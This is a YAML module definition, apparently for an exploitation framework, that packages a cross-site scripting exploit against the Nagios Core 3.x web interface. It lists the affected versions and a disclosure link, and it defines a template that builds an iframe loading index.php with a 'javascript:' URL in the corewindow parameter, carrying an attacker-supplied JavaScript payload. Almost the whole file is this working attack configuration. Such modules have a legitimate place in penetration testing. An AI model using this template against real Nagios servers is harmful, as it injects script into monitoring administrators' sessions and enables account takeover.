---
structure_version: 0
data:
  module_type: xss_get
  name: nagios-corewindow
  description: Exploits a flaw in the way that web UI for Nagios Core displays loads untrusted URLs

  metadata:
    vendor: Nagios Enterprises
    affected_versions: '3.x'
    links:
      - http://seclists.org/fulldisclosure/2016/Jun/20

    exploit_version: 1
    developers:
      - Joel Rangsmo <joel@rangsmo.se>

  options:
    - name: NAGIOS_PATH
      description: Sub-path for Nagios application on web server
      option_type: string
      default: "/nagios"
      required: false

      constraints:
        - constraint_type: length
          options:
            max: 300 

    - name: PAYLOAD
      description: JavaScript payload to be included in URI 
      option_type: payload
      default: ""
      required: true

      constraints:
        - constraint_type: length
          options:
            max: 300 

  inherited_options:
    - PROTO
    - HOST
    - PORT

  template: '<iframe src="{{ PROTO }}://{{ HOST }}:{{ PORT }}{{ NAGIOS_PATH }}/index.php?corewindow=javascript:{{ PAYLOAD | urlencode }}"></iframe>'
  
  instance_id: '{{ PROTO }}://{{ HOST }}:{{ PORT }}{{ NAGIOS_PATH }} - "{{ PAYLOAD | truncate(10, True) }}"'
